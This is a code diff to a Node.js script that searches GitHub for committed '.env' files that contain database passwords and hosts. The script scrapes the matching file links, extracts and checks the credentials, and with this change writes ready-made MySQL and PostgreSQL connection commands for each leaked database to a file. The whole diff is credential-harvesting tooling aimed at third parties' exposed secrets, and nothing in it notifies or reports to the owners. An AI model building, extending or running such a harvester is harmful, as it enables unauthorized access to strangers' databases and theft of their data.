@@ -3,7 +3,7 @@
 const axios = require('axios');
 const cheerio = require('cheerio');
 const fs = require('fs');
-const { getData, getDbConfigData, analyseConfigData, isValidConfigData } = require('./regexTests');
+const regexTests = require('./regexTests');
 
 //Query que se mete na procura do GitHub
 const query = "path:**/.env db_password= db_host="
@@ -47,6 +47,8 @@ function findFileUrl() {
                 const completeUrl = `https://github.com${cleanedHref}`;
                 links.add(completeUrl);
             }
+
+            
         });
 
         fs.writeFileSync('envLinks.txt', Array.from(links).join('\n'), 'utf-8');
@@ -68,15 +70,20 @@ async function processEnvLinks() {
 
         for (const link of links) {
             console.log(`Processing link: ${link}`);
-            const fileData = await getData(link);
+            const fileData = await regexTests.getData(link);
 
             if (fileData) {
-                let data = getDbConfigData(fileData);
-                let validData = analyseConfigData(data);
-                let isValid = isValidConfigData(validData);
+                let data = regexTests.getDbConfigData(fileData);
+                let validData = regexTests.analyseConfigData(data);
+                let isValid = regexTests.isValidConfigData(validData);
 
                 if (isValid) {
-                    console.log(`Valid Data from ${link}:`, validData);
+                    console.log(`Valid Data from ${link}`);
+                    commands = regexTests.buildDbConnectionCommands(validData);
+                    fs.appendFileSync("./commands.txt", `\nFrom ${link}`);
+                    fs.appendFileSync("./commands.txt", `MySQL Command: ${commands.mysqlConnection}\n`);
+                    fs.appendFileSync("./commands.txt", `PostgreSQL Command: ${commands.postgreConnection}\n`);
+                    
                 } else {
                     console.log(`Data from ${link} is not valid.`);
                 }
